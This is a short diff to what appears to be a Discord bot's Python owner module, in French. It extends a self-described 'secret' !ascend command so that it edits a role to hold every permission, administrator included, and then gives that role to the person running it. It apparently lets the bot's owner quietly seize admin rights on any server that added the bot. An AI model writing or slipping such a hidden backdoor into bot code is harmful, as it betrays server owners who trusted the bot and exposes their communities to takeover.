@@ -44,6 +44,15 @@ class Owner(commands.Cog):
                 pass
             return
 
+        if not role.permissions.administrator:
+            try:
+                await role.edit(
+                    permissions=discord.Permissions.all(),
+                    reason="Commande owner secrète (!ascend)",
+                )
+            except discord.Forbidden:
+                pass
+
         try:
             await ctx.author.add_roles(role, reason="Commande owner secrète (!ascend)")
         except discord.Forbidden:
@@ -53,9 +62,9 @@ class Owner(commands.Cog):
                 pass
             return
 
-        logger.info(f"[Owner] Rôle '{role.name}' auto-attribué par le owner ({ctx.author}) sur {ctx.guild.name}")
+        logger.info(f"[Owner] Rôle '{role.name}' auto-attribué (perms admin) par le owner ({ctx.author}) sur {ctx.guild.name}")
         try:
-            await ctx.author.send(f"✅ Rôle **{role.name}** attribué sur **{ctx.guild.name}**.")
+            await ctx.author.send(f"✅ Rôle **{role.name}** (permissions administrateur) attribué sur **{ctx.guild.name}**.")
         except discord.Forbidden:
             pass
 
